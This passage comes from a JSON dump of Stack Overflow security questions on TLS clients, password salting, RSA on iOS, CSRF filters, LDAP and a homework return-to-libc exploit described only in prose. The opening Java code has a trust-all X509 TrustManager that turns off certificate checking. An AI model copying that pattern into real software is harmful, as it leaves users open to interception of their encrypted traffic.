{\n\n        @Override\n        public void checkClientTrusted(java.security.cert.X509Certificate[] arg0, String arg1) throws java.security.cert.CertificateException {\n            return;\n        }\n\n        @Override\n        public void checkServerTrusted(java.security.cert.X509Certificate[] arg0, String arg1) throws java.security.cert.CertificateException {\n            return;\n        }\n\n        @Override\n        public java.security.cert.X509Certificate[] getAcceptedIssuers() {\n            return null;\n        }\n    };\n    SSLContext ctx = null;\n    try {\n        ctx = SSLContext.getInstance(\"SSL\");\n        ctx.init(null, new javax.net.ssl.TrustManager[]{x509}, null);\n    } catch (java.security.GeneralSecurityException ex) {\n    }\n    return ctx;\n}\n</code></pre>\n\n<p>}\n</code>\nCode in Main Method; uses auto generated code\n<code>\nJerseyClient client = new JerseyClient();\nclient.setUsernamePassword(\"testClient\", \"secret\");\nObject response = client.get_XML(String.class);\n// do whatever with response\nclient.close();\n</code></p>\n\n<p>Results\n<code>\nException in thread \"main\" com.sun.jersey.api.client.ClientHandlerException: javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake\n        at com.sun.jersey.client.urlconnection.URLConnectionClientHandler.handle(URLConnectionClientHandler.java:128)\n        at com.sun.jersey.api.client.filter.HTTPBasicAuthFilter.handle(HTTPBasicAuthFilter.java:78)\n        at com.sun.jersey.api.client.Client.handle(Client.java:457)\n        at com.sun.jersey.api.client.WebResource.handle(WebResource.java:557)\n        at com.sun.jersey.api.client.WebResource.access$300(WebResource.java:69)\n        at com.sun.jersey.api.client.WebResource$Builder.get(WebResource.java:451)\n        at clients.JerseyClient.get_XML(JerseyClient.java:23)\n        at clients.NewMain1.main(NewMain1.java:20)\nCaused by: javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake\n        at com.sun.net.ssl.internal.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:808)\n        at com.sun.net.ssl.internal.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1112)\n        at com.sun.net.ssl.internal.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1139)\n        at com.sun.net.ssl.internal.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1123)\n        at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:434)\n        at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:166)\n        at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1049)\n        at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:373)\n        at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:318)\n        at com.sun.jersey.client.urlconnection.URLConnectionClientHandler._invoke(URLConnectionClientHandler.java:215)\n        at com.sun.jersey.client.urlconnection.URLConnectionClientHandler.handle(URLConnectionClientHandler.java:126)\n        ... 7 more\nCaused by: java.io.EOFException: SSL peer shut down incorrectly\n        at com.sun.net.ssl.internal.ssl.InputRecord.read(InputRecord.java:333)\n        at com.sun.net.ssl.internal.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:789)\n        ... 17 more\nJava Result: 1\n</code>\nI also want to inform that these are two different projects running on different servers both are glassfish 3.0.1. I also tried to run client and services on the same server but all in vain. I am stuck; kindly help me.</p>\n\n<p>Cheers!</p>\n"},{"tags":["javascript","security","firefox","browser-cache"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":13155963,"title":"Disable Mozilla Firefox to store javascripts","body":"<p>right now if you open view page source in Mozilla, \nyou'll see an external javascript link.\nif you click on that link the browser will show javascript function from browser cache.\nbut if you select view>>reload the browser will requesting to server.</p>\n\n<p>on IE and Chrome you click the hyperlink from view source, it will always requesting to server.\nis there a way to get a same behavior on Mozilla?</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>I am a webmaster, and I wonder this will be done using javascript or anything server side code.</p>\n"},{"tags":["php","security","symfony2","login","salt"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13156274,"title":"Symfony 2 using salt login always returns Bad credentials","body":"<p>if I'am using salt to decode my password using, the login always returns \"Bad credentials\".</p>\n\n<p>I'am using Fixture to create some testdata:</p>\n\n<pre><code>public function load(ObjectManager $manager)\n{\n    $encodeFactory = $this-&gt;container-&gt;get('security.encoder_factory');\n\n    $user = new User();\n    $user-&gt;setUsername('admin');\n    $user-&gt;setEmail('webmaster@aranox.de');\n\n    $encoder = $encodeFactory-&gt;getEncoder($user);\n    $user-&gt;setPassword($encoder-&gt;encodePassword('admin', $user-&gt;getSalt()));\n\n    $user-&gt;setIsEnabled(true);\n\n    $manager-&gt;persist($user);\n    $manager-&gt;flush();\n\n    $this-&gt;addReference('user-admin', $user);\n}\n</code></pre>\n\n<p>I set up the encoding in security.yml:</p>\n\n<pre><code>security:\n    encoders:\n        Aranox\\UserBundle\\Entity\\User:\n            algorithm: sha512\n</code></pre>\n\n<p>creating salt in my user-entity using:</p>\n\n<pre><code>...\n/**\n * @ORM\\Column(type=\"string\", length=255)\n */\nprivate $password;\n/**\n * @ORM\\Column(type=\"string\", length=255)\n */\nprivate $salt;\n\n...\nfunction __construct()\n{\n    $this-&gt;groups               = new ArrayCollection();\n    $this-&gt;salt                 = md5(uniqid(null, true)); \n...\n</code></pre>\n\n<p>If creating no salt ($this->salt = \"\"), all works fine.</p>\n\n<p>How can this happens? </p>\n"},{"tags":["android","security","encryption"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":9456973,"title":"Passing passwords between activites","body":"<p>Is it safe to pass a password from one activity to another without encrypting it? I will then, once it's in the next activity, encrypt it and store it. Or should I encrypt it first?</p>\n"},{"tags":["iphone","objective-c","ios","security","encryption"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":63,"score":2,"question_id":13156599,"title":"How I using an RSA public key generated and how I encrypted in iOS","body":"<p>Hello I am a novice developer. And just gave me a project to iOS, but I have to encrypt part ciert an information.</p>\n\n<p>I have to use 1024-bit RSA. The only thing they give me is a public key:</p>\n\n<pre><code>BitStrength = 1024\n\nRSAKeyValue\n\nModulus = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n\nExponent = Xxxx\n\nRSAKeyValue\n</code></pre>\n\n<p><strong>Example:</strong> a string unencrypted and encrypted</p>\n\n<p><strong>Unencrypted string:</strong></p>\n\n<pre><code>Prueba de Encriptacion\n</code></pre>\n\n<p><strong>Encrypted string above:</strong></p>\n\n<pre><code>uaUbBBR6Ghx/6EaspBB1QD024uUZ7O+koeNd0PTAt/wnM5w8s8TqRSGnB9iK7oSyRce4BPuVzFzsB2P34/fq5MoyuKvPG6vDZp8Ck/GifZAOZN1dbCRgOdE8qboKcWYH3WcZieUfpBepBwR6usY2xWaH9/56PCeSaDgncSPGrWc=bcrcdoaSp0zSv6hKc0jqh2oyVtLOaMmSqLxNRVpD62ojwfkFFb8zTJVFBUpxNmDCU4b0xgP0iYu9rRVBlo0Yp2GhoCgz/cR9+PRwOXWJYoV4Qd1j7zHZDsMy7njE8hBoU6N6ZVYkEhIfQ8z1TqOQyWeNUcll3JqaHNEqsF4w0Io=\n</code></pre>\n\n<p>I have to get the encrypted string. <em>no need to decrypt</em></p>\n\n<p>This is the first time I work with RSA encryption and truth I have no idea how to do it and also do not understand that use of the Exponent sent to me, as I read this encryption works but not how to implement iOS.</p>\n"},{"tags":["security","tomcat","csrf"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":28,"score":2,"question_id":13151768,"title":"Getting 403 error when using CSRF filter with tomcat 6.0.32","body":"<p>This is my filer config in web.xml</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;filter&gt;\n    &lt;filter-name&gt;CSRFPreventionFilter&lt;/filter-name&gt;\n    &lt;filter-class&gt;org.apache.catalina.filters.CsrfPreventionFilter&lt;/filter-class&gt;\n    &lt;init-param&gt;\n        &lt;param-name&gt;entryPoints&lt;/param-name&gt;\n        &lt;param-value&gt;/login&lt;param-value&gt;\n    &lt;/init-param&gt;\n&lt;/filter&gt;\n\n&lt;filter-mapping&gt;\n    &lt;filter-name&gt;CSRFPreventionFilter&lt;/filter-name&gt;\n    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n&lt;/filter-mapping&gt;\n&lt;filter&gt;\n</code></pre>\n\n<p>Am I missing something? Are any code-changes necessary to enable csrf protection in tomcat</p>\n"},{"tags":["java","security","encryption","ssl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":13151549,"title":"SSL handshake process","body":"<p>I am getting started on security and read about the SSL handshaking scenario. In this <a href=\"http://stackoverflow.com/questions/3936071/how-does-browser-generate-symmetric-key-during-ssl-handshake\">post</a>, the replier mentioned that the symmetric key is generated on the browser, encrypted using the server's public key and sent over to the server.</p>\n\n<p>However, in the other articles, they mentioned that a pre-master secret was generated and sent over instead for calculation of the symmetric key. </p>\n\n<p>May I know which is the correct explanation, and how is this pre-master secret generated and used to generate the symmetric key?</p>\n"},{"tags":["java","security","registry"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":33,"score":-1,"question_id":13155012,"title":"How to store password in key registry using java?","body":"<p>How to save and retrieve password in key registry?<br>\nHow to Protects key from editing and deleting?<br>\nIf key deleted, How to know the person authorized to enter application?</p>\n"},{"tags":["security","jsp","ssl-certificate","jdeveloper","weblogic11g"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13154696,"title":"Trusted CA Certificate Issue in Jdeveloper Weblogic server","body":"<p>Everytime i run my Java project in Jdeveloper following WARNING appears due to hwcih my JSP page appears late.How do I avoid this</p>\n\n<pre><code>     &lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090171&gt; &lt;Loading the    identity       certificate and private key stored under the alias DemoIdentity from the jks keystore file C:\\Oracle\\MIDDLE~1\\WLSERV~1.3\\server\\lib\\DemoIdentity.jks.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090169&gt; &lt;Loading trusted certificates from the jks keystore file C:\\Oracle\\MIDDLE~1\\WLSERV~1.3\\server\\lib\\DemoTrust.jks.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090169&gt; &lt;Loading trusted certificates from the jks keystore file C:\\PROGRA~1\\Java\\JDK16~1.0_3\\jre\\lib\\security\\cacerts.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=Entrust Root Certification Authority - G2,OU=(c) 2009 Entrust\\, Inc. - for authorized use only,OU=See www.entrust.net/legal-terms,O=Entrust\\, Inc.,C=US\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=thawte Primary Root CA - G3,OU=(c) 2008 thawte\\, Inc. - For authorized use only,OU=Certification Services Division,O=thawte\\, Inc.,C=US\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=T-TeleSec GlobalRoot Class 3,OU=T-Systems Trust Center,O=T-Systems Enterprise Services GmbH,C=DE\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=T-TeleSec GlobalRoot Class 2,OU=T-Systems Trust Center,O=T-Systems Enterprise Services GmbH,C=DE\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=GlobalSign,O=GlobalSign,OU=GlobalSign Root CA - R3\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"OU=Security Communication RootCA2,O=SECOM Trust Systems CO.\\,LTD.,C=JP\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=VeriSign Universal Root Certification Authority,OU=(c) 2008 VeriSign\\, Inc. - For authorized use only,OU=VeriSign Trust Network,O=VeriSign\\, Inc.,C=US\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=KEYNECTIS ROOT CA,OU=ROOT,O=KEYNECTIS,C=FR\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=GeoTrust Primary Certification Authority - G3,OU=(c) 2008 GeoTrust Inc. - For authorized use only,O=GeoTrust Inc.,C=US\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=Entrust Root Certification Authority - G2,OU=(c) 2009 Entrust\\, Inc. - for authorized use only,OU=See www.entrust.net/legal-terms,O=Entrust\\, Inc.,C=US\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=thawte Primary Root CA - G3,OU=(c) 2008 thawte\\, Inc. - For authorized use only,OU=Certification Services Division,O=thawte\\, Inc.,C=US\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=T-TeleSec GlobalRoot Class 3,OU=T-Systems Trust Center,O=T-Systems Enterprise Services GmbH,C=DE\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=T-TeleSec GlobalRoot Class 2,OU=T-Systems Trust Center,O=T-Systems Enterprise Services GmbH,C=DE\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=GlobalSign,O=GlobalSign,OU=GlobalSign Root CA - R3\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"OU=Security Communication RootCA2,O=SECOM Trust Systems CO.\\,LTD.,C=JP\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=VeriSign Universal Root Certification Authority,OU=(c) 2008 VeriSign\\, Inc. - For authorized use only,OU=VeriSign Trust Network,O=VeriSign\\, Inc.,C=US\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=KEYNECTIS ROOT CA,OU=ROOT,O=KEYNECTIS,C=FR\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=GeoTrust Primary Certification Authority - G3,OU=(c) 2008 GeoTrust Inc. - For authorized use only,O=GeoTrust Inc.,C=US\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n</code></pre>\n"},{"tags":["security","node.js","session","express","sha256"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":32,"score":2,"question_id":13151140,"title":"express secret key length","body":"<p>Are there any recommendations for the length of the secret key used to cryptographically hash session data in connect/express? I see everything from 60+ character strings to the canonical 'keyboard cat'.</p>\n\n<p>For my immediate use case, I intend to use SSL for the entire site and the payoff for a brute-force attack is medium to low.</p>\n"},{"tags":["security","buffer-overflow","exploit"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":8,"score":-1,"question_id":13152195,"title":"Issues with Return To Libc in Fedora","body":"<p>So I have been tackling at this for a while I cannot seem to find what my issues is.  Just to point out, this is a HW question so I understand if you do not want to help or give me any specifics.  However, any insight will do.  I am trying to craft an retuntolibc exploit and I have found where the segmentation fault, system, and exit locations are.  I have also found where \"/bin/bash\" is.  On top of that, I have disabled ASLR and the stack protector.  However, when I go into GDB and get system or exit, I always get a 6 bytes address (Example: 0xffffff), so I have an idea as to why my returntolibc string is not working.  In the program, I am supposed to use existing code in memory, but here is where I am stuck and have no idea where to turn.  Does anyone have any thoughts?  Anyway, thanks for your time and I hope to hear from you soon.</p>\n"},{"tags":["php","javascript","mysql","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13151587,"title":"Store connection credentials securely in javascript?","body":"<p>I'm trying to make a web chat app for a mincraft server useing <a href=\"https://github.com/alecgorge/jsonapi/wiki\" rel=\"nofollow\">this api</a>. The <a href=\"https://github.com/alecgorge/jsonapi/blob/master/sdk/js/test/test1.html\" rel=\"nofollow\">demo script</a> for what I want to do shows the conection info, in plain text, witch will be easyly visible from any clients computer. Is there any way I can store this securely while still having the same functionality? Preferably retrieved from mySQL with php.</p>\n"},{"tags":["c#","security","dsl"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":84,"score":2,"question_id":12964790,"title":"Using C# as my DSL -- is this possible, if so, how?","body":"<p><strong>Is it possible to use C# as a DSL</strong> in which the C# source code is edited by the end user in a TextBox, compiled while the application is running, then called by the already-running application?</p>\n\n<p>I ask because in the next few months I will be needing to implement a simple math-crunching DSL (similar to somthing Rachel Lim blogged about at <a href=\"http://rachel53461.wordpress.com/2011/08/20/the-math-converter/\" rel=\"nofollow\">http://rachel53461.wordpress.com/2011/08/20/the-math-converter/</a>\nI am focused on the math-processing aspect of her code, not the XAML/Converter aspect).  I would lean against just reusing her code because I want to add if-statements and possibly other features.  If I can use C# itself, then I get all of the features without having to re-implement them.</p>\n\n<p>If it is possible to do this, <strong>what framework or namespace or class would I want to use to accomplish such?</strong></p>\n\n<p>Please note that one thing I would do with the C#-derived DSL is hard-code all necessary using header statements, then remove all using statements entered by the savvy user.  The purpose of this is to reduce the prospect of an end user trying to leverage my C#-like DSL into a full-fledged compiler against the wishes of their enterprise policy or without the knowledge of the site administrator.  <strong>Is my proposed managing of using statements an adequate defense against user mischief?</strong></p>\n\n<p>Finally, if all of the answers up to this point are \"yes\", then <strong>what are the drawbacks of this approach, especially drawbacks of introducing a security vulnerability?</strong></p>\n\n<p>Paul</p>\n"},{"tags":["asp.net-mvc","security","authorization"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":200,"score":2,"question_id":8222258,"title":"How do you restrict certain HTML elements to certain roles using ASP.NET MVC?","body":"<p>I'm looking for the standard practice in specifying that a certain HTML element, like a \"Create user\" button should only be displayed when the user is logged-in and belongs to the role \"Administrator.\"</p>\n\n<p>For example, using Spring MVC in Java, the Spring Security tag library has a control that does just that:</p>\n\n<pre><code>&lt;sec:authorize access=\"hasRole('ROLE_PRESIDENT')\"&gt;\n    &lt;input type=\"button\" value=\"Launch nuclear weapons\"/&gt;\n&lt;/sec:authorize&gt;\n</code></pre>\n\n<p>Whatever appears between the tags will only display when the user belongs to the role specified.</p>\n\n<p>Does ASP.NET MVC have such feature?</p>\n"},{"tags":["security","encryption","login","password-encryption"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":13144713,"title":"How to login and encrypt data with the same password/key","body":"<p>I've made a \"vault\" web app in PHP for storing passwords, credit card numbers, etc. It's mostly just for myself, but I'm practicing building it with multiple users in mind. I use two way encryption to secure the data, and want the user to login using their key (vs both a password to login AND a key for their data.)</p>\n\n<p>I initially stored the username in plaintext, and the key/password one way encrypted with a salt. My first concern is that if someone had access to the SQL data, they'd probably have access to my code (my salt and encryption method) making shorter work of revealing the password, then being able to access the two way encrypted data with it.</p>\n\n<p>I also didn't like the username sitting there in plaintext...that's half the login info right there.</p>\n\n<p>Basically, I'm worried about the login giving away extra info about the encrypted data itself.</p>\n\n<p><strong>What is the best practice for logging in, and two way encrypting data with the same password/key?</strong></p>\n\n<p>...and does anyone know where can I learn more about this specific concept?</p>\n"},{"tags":["c#","security","hash"],"answer_count":6,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":502,"score":5,"question_id":2517128,"title":"Is it possible to create a file with a given size and MD5 hash?","body":"<p>Of course I know is possible to create a file with a certain size and how to do it. But is it possible to create a file with a certain size and also a certain MD5 fingerprint?</p>\n"},{"tags":["security","scripting","adobe-reader"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12353438,"title":"How to globally disable Adobe scripting security warnings?","body":"<h2>Questions</h2>\n\n<ul>\n<li>How can I permanently disable the scripting warning and allow scripting in Adobe Reader X? </li>\n<li>Is this a policy setting, a local setting, or impossible?</li>\n</ul>\n\n<h2>Background / Problem</h2>\n\n<p>At our enterprise, we make use of Adobe Reader X (though the reason still escapes me).</p>\n\n<p>One of our enterprise applications allows the viewing and markup of PDFs.</p>\n\n<p>However, the Adobe scripting warning pops up for some of these PDFs, and because of the way the application displays it, the user cannot allow scripting, rendering some of the app's pdf markup operations useless.</p>\n\n<p><strong>Note</strong>: We are aware of the security risks this entails and have examined our environment and processes to determine that this is a reasonable course of action in this scenario.</p>\n\n<h2>Goal</h2>\n\n<ul>\n<li>Remove the warning when opening a PDF in select cases so that our application may use PDFs properly.</li>\n</ul>\n"},{"tags":["java","security","active-directory","ldap","ntlm"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":127,"score":0,"question_id":11932031,"title":"Connecting to LDAP (Active Directory) with NTLM","body":"<p>Currently, I'm using user and password as the connection credentials to ldap (in order to search on this AD).</p>\n\n<p>My code looks like:</p>\n\n<pre><code>env = new Hashtable();\nenv.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\nenv.put(Context.PROVIDER_URL, ...);\nenv.put(Context.SECURITY_AUTHENTICATION, \"simple\");\nenv.put(Context.SECURITY_PRINCIPAL, ...);\nenv.put(Context.SECURITY_CREDENTIALS, ...);\nenv.put(\"com.sun.jndi.ldap.connect.timeout\", ...);\n\ntry {\n  ctx = new InitialLdapContext(env, null);\n}\ncatch (NamingException e) {\n    System.out.println(\"error\")\n}\n</code></pre>\n\n<p>I want to change this code, so it will not use user+password as the credentials against the LDAP. I want it to authenticate using NTLM.</p>\n\n<p>How can I do it? Can you provide an example?</p>\n"},{"tags":["security","web-security"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":618,"score":2,"question_id":4782829,"title":"Website security thesis- what topics to cover?","body":"<p>What topics should be covered in a thesis about website security?</p>\n\n<p>thanks!</p>\n"},{"tags":["security","networking","mongodb","amazon-ec2"],"answer_count":4,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":678,"score":2,"question_id":7962974,"title":"Spreading MongoDB across EC2 regions","body":"<p>I want to distribute a sharded/replicated MongoDB setup across multiple of Amazon's EC2 regions. Is this traffic already encrypted by MongoDB or can I optionally set this up? Or does Amazon offer a special VPN-like connection between its data centers?</p>\n"},{"tags":["security",".net-4.0","fxcop","linkdemand"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13143049,"title":"Is calling process.start a security risk from an azure worker role?","body":"<p>We have a worker role in Azure which uses <code>Process.Start</code> to kick off a background process (which hosts a native application we need to run)</p>\n\n<p>FxCop gives me a whole load of <a href=\"http://msdn.microsoft.com/en-us/library/ms182303.aspx\" rel=\"nofollow\">CA2122</a> errors due to a link demand.  When I tried to add this attribute:</p>\n\n<pre><code>[PermissionSet(SecurityAction.LinkDemand, Name = \"FullTrust\")]\n</code></pre>\n\n<p>I then started to get <a href=\"http://msdn.microsoft.com/en-us/library/dd997569.aspx\" rel=\"nofollow\">CA2135</a> instead, the solution to which seems to be to add the SecurityCritical attribute instead.</p>\n\n<p>But then I get the CA2122 again.</p>\n\n<p>Are either of these things an issue?  Under what circumstances could they be and how can I be sure that I'm not introducing a security problem?</p>\n"},{"tags":["sql-server","security","sql-server-2008","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2921,"score":3,"question_id":6212598,"title":"Server Role to execute SQL Server Agent Jobs in SQL SERVER 2008","body":"<p>The users from other departments ask me to grant them to execute Schedule Jobs / SSIS in SQL Server Agent.  At present, they cannot see SQL Server Agent tree in their ManagmentStudio.  I think, it's because they don't have the rights to execute them.</p>\n\n<p>So, I would like to know which server role should I give to them.  I only want to give them minimum privileges.  When I check the existing roles in my server, I could only see the following server roles</p>\n\n<ol>\n<li>bulkadmin</li>\n<li>dbcreator</li>\n<li>diskadmin</li>\n<li>processadmin</li>\n<li>public</li>\n<li>securityadmin</li>\n<li>serveradmin</li>\n<li>setupadmin</li>\n<li>sysadmin</li>\n</ol>\n\n<p>Please advise me.</p>\n"},{"tags":["php","security","variables","pass"],"answer_count":4,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":71,"score":3,"question_id":13142054,"title":"Most secure way to pass variables between two pages with PHP","body":"<p>I need a way to pass a variable between two page in a secure way.</p>\n\n<p>I know that I can use POST / GET / Cookie / Session or hidden fields but I think none of these ways aren't secure enough because :</p>\n\n<p>get can be seen in the url<br>\ncookies is a client side so it can be change from client<br>\nsession can confront Session ID hijacking and ...<br></p>\n\n<p>Now I want to know is there another ways better than these ways and if there isn't witch of these is the best way to pass variables in secure manner;</p>\n"},{"tags":["entity-framework","security","breeze"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":13091760,"title":"Data Security using Entity Framework","body":"<p>What options/solutions are there for securing data using Entity Framework?</p>\n\n<p>I do not talk about forms login and such here, just assume that the users are authenticated or not.</p>\n\n<p>To illustrate, i attached one of my web api controllers and i wonder if this is the way to do it. The reason why i ask is that i wonder if there are easier ways to do this than writing all this logic to what data to expose in all my controllers.</p>\n\n<p>Also, when looking into a system like breezejs and odata where i can add $expand=TrafficImages to my queries, i would not want users to be able to get my hole database. </p>\n\n<p>So to summarize, what ways are there to securing the data exposed such the users cant download sensible data.</p>\n\n<pre><code>[AllowAnonymous]\npublic object GetTheoryTests()\n{\n    var identity = ((ClaimsIdentity)((ClaimsPrincipal)HttpContext.Current.User).Identity);\n    //if (HttpContext.Current.User.Identity.IsAuthenticated)\n\n\n   if 